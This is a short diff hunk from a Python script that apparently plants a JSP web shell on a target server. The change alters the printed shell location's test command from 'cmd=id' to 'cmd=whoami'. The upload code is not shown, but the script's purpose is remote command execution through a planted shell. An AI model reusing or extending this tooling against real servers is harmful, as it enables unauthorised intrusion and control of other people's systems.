@@ -90,10 +90,11 @@ def main():
             location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
         else:
             location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=whoami"
-        print(f"[+] Shell should be at: {location}?cmd=id")
+        print(f"[+] Shell should be at: {location}?cmd=whoami")
     except Exception as e:
         print(e)
 
 
 if __name__ == '__main__':
     main()
+
